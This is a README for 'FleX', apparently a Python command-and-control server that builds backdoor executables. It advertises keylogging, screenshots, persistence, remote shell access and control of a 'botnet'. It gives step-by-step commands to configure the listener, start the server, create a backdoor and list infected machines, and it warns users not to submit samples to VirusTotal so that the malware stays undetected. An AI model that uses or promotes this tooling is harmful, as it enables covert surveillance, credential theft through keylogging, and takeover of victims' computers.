# Lv711

FleX. A Simple C&C Server Written In Python.

__Warning:__  Do not submit any of the samples generated by this software to online scanners such as, Virustotal and NoDistribute. Doing so will render the software useless.
 
# Features
  - Upload & Download
  - Auto-persistence
  - Screenshot
  - Keylogger
  - Shell
  
You can also:
  - Get system information of a remote computer
  - Get the geolocation of a remote computer
  - Launch chrome on a remote computer
  - Shutdown a remote computer

### Requirements

* [Mss](https://pypi.python.org/pypi/mss/) - Used for screenshots
* [Cmd2](https://pypi.python.org/pypi/cmd2) - Interactive command line
* [Wine](https://www.winehq.org/) - Used for generating  executables
* [Requests](http://docs.python-requests.org/en/master/) - Used for Accessing the internet

### Installation

FleX requires [Python](https://www.python.org/downloads/release/python-2714/) v2.7 and [Kali Linux](https://www.kali.org/downloads/) to run.

Install the requirements 
```sh
$ cd setup
$ python install.py
```

Start the program
```sh
$ cd ..
$ python flex.py
```

View all of commands
```sh
$ help
```

Get detail about a command
```sh
$ help getinfo
```

Configure the server
```sh
$ setip 127.0.0.1
$ setport 4444
```

View the server status
```sh
$ server_info
```

Start the server
```sh
$ server_start
```

Create a backdoor
```sh
$ create 127.0.0.1 4444  Lv711
```

Display connected computers and their corresponding ID's
```sh
$ botnet
```
